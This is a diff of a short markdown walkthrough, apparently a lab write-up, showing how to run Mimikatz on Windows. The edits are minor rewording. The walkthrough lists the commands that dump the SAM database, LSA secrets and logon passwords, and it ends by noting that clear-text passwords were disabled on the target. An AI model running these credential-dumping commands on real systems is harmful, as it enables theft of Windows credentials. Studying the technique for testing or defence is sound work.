@@ -16,7 +16,7 @@ Mimikatz is a free and open source program for Microsoft Windows that can be use
  - .\mimikatz.exe <br>
 <img src="exe.png" width=70% height="auto"><br><br>
 ### Check the privilage for dumping the credentials
- - privilege::debug (vedi se ho i privilegi) <br>
+ - privilege::debug <br>
 <img src="priv.png" width=70% height="auto"><br><br>
 ### Dump the database sam 
  - lsadump::sam <br>
@@ -24,12 +24,12 @@ Mimikatz is a free and open source program for Microsoft Windows that can be use
 ### Dump the secrets
  - lsadump::secrets <br>
 <img src="secret.png" width=70% height="auto"><br><br>
-### Dump the logon password, if bad configured, we have the password in clear text.
+### Dump the logon password. The password might be in clear text.
  - sekurlsa::logonpasswords <br>
 <img src="logon.png" width=70% height="auto"><br><br>
 
 
- Unfortunately, there is no logon password in clear text, because they disabled it, so it is well configured.
+ **Unfortunately, there is no logon password in clear text, because they disabled it, so it is well configured.**
 
 
 
